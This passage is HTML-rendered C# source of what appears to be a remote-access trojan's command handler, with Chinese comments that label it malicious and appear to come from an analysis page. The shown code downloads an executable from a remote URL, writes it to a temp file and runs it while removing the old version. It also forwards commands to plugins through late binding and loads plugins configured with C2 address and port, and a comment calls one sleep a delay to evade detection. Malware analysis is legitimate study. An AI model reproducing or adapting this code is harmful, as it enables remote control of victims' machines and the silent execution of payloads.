style="--0:#4D9375;--1:#1E754F">catch</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">MSG</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Update ERROR</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">bla</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">return</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 场景2：从远程URL下载更新包</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">else</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#5DA994;--1:#2E8F82">WebClient</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">wc</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">WebClient</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">updateData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">wc</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">DownloadData</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">]);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">catch</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">MSG</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Update ERROR</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">bla</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">return</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">bla</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">tempExe</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Path</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetTempFileName</span><span style="--0:#666666;--1:#999999">()</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">.exe</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 临时更新文件</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">MSG</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D;--1:#B56959">Updating To </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#C98A7D;--1:#B56959"> </span><span style="--0:#5DA994;--1:#2E8F82">FileInfo</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D;--1:#B56959">tempExe</span><span style="--0:#666666;--1:#999999">).</span><span style="--0:#C98A7D;--1:#B56959">Name</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">Thread</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Sleep</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">2000</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 延迟规避检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">File</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">WriteAllBytes</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">tempExe</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">updateData</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 写入新恶意程序</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">Process</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Start</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">tempExe</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">..</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 启动新版本</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#C98A7D;--1:#B56959">MSG</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D;--1:#B56959">Update ERROR </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">ex</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Message</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">UNS</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 卸载旧版本</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 指令分支10：Ex - 转发指令到已加载的插件 ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">cmdType</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Ex</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 无插件则等待加载</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">PLG</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">waitCount</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">while</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">&#x26;&#x26;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">waitCount</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">&#x3C;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">20</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">&#x26;&#x26;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Cn</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">waitCount</span><span style="--0:#CB7676;--1:#AB5959">++</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">Thread</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Sleep</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">1000</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">||</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Cn</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">return</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 反射调用插件的ind方法，转发指令字节数组</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">args</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">};</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">bool</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">isRef</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">bool</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">};</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateCall</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">ind</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">args</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">isRef</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 接收插件返回的字节数组</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">isRef</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">])</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[])</span><span style="--0:#BD976A;--1:#B07D48">args</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">];</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 指令分支11：PLG - 加载恶意插件（扩展功能） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">else</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">cmdType</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">PLG</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 提取并解压插件数据</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ms</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">skipLen</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">$"</span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#C98A7D;--1:#B56959">array</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">]}{</span><span style="--0:#C98A7D;--1:#B56959">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#C98A7D;--1:#B56959">Y</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Write</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">skipLen</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">skipLen</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">pluginData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ZIP</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">ms</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToArray</span><span style="--0:#666666;--1:#999999">());</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 加载插件并设置核心参数（C2连接、地址、端口）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> 